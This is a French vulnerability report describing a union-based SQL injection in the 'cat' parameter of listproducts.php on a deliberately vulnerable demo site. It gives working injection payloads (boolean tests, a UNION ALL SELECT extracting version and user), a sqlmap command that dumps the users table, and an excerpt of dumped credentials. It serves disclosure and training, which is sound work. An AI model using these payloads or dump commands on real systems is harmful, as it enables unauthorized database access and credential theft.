#29-01-2026 
✦ Titre: Compromission de la confidentialité des données via SQL Injection
  sur listproducts.php

  Résumé :
  Une vulnérabilité critique d'injection SQL (SQLi) de type Union-Based a été
  identifiée sur le point de terminaison
  http://testphp.vulnweb.com/listproducts.php. Cette faille permet à un
  attaquant non authentifié d'exécuter des requêtes SQL arbitraires,
  entraînant l'exfiltration complète de la base de données, y compris la
  table users contenant des identifiants administratifs et des informations
  personnelles sensibles.

  Description :
  Le paramètre cat de la page listproducts.php ne nettoie pas correctement
  les entrées utilisateur avant de les concaténer dans une requête SQL
  backend. Le serveur, utilisant une version obsolète de PHP (5.6.40) et
  MySQL, permet l'injection de commandes SQL via l'opérateur UNION.

  En injectant un payload spécifique, un attaquant peut manipuler la requête
  originale pour joindre les résultats d'une requête malveillante.
  L'exploitation réussie a permis d'énumérer la structure de la base de
  données (acuart), de lister les tables (users, products, etc.) et de dumper
  le contenu de la table users.

  Cette exploitation a révélé :
   1. Le mot de passe en clair de l'utilisateur test.
   2. Une vulnérabilité XSS stockée préexistante dans le champ name d'un
      utilisateur.
   3. L'absence de privilèges suffisants (FILE) pour écrire un webshell,
      limitant l'attaque à l'exfiltration de données massives.

  Etapes à reproduire :

   4. Identifier le point de terminaison vulnérable :
      http://testphp.vulnweb.com/listproducts.php?cat=1

   5. Vérifier la vulnérabilité en injectant une condition logique simple
      (Boolean-based) ou un délai (Time-based) :
      http://testphp.vulnweb.com/listproducts.php?cat=1 AND 1=1 (Retourne une
  page normale)
      http://testphp.vulnweb.com/listproducts.php?cat=1 AND 1=2 (Retourne une
  page vide ou différente)

   6. Exploiter l'injection Union-Based pour extraire la version de la base
      de données et l'utilisateur courant :
      http://testphp.vulnweb.com/listproducts.php?cat=1 UNION ALL SELECT
  NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(version(),0x3a,user()),NULL,NULL,NULL,
  NULL-- -

   7. Exfiltrer la table users (exemple utilisant sqlmap pour automatisation)
      :
      sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart
  -T users --dump

  Matériel d'appui/références :
   - Payload utilisé : cat=1 UNION ALL SELECT ...
   - Outil de confirmation : SQLMap v1.9.11
   - Preuve d'exfiltration (extrait) :
    Username: test
    Password: test
    Email: kalki@example.com

  Impact :
  Cette vulnérabilité permet à un attaquant distant et non authentifié de
  lire l'intégralité de la base de données de l'application. Cela inclut les
  identifiants de connexion des utilisateurs et des administrateurs, les
  données personnelles (PII) telles que les emails, adresses et numéros de
  téléphone, ainsi que toute autre donnée métier sensible. La compromission
  de ces informations peut mener à une prise de contrôle totale des comptes
  utilisateurs, à une atteinte à la réputation, et à des violations de
  conformité réglementaire (GDPR, etc.).
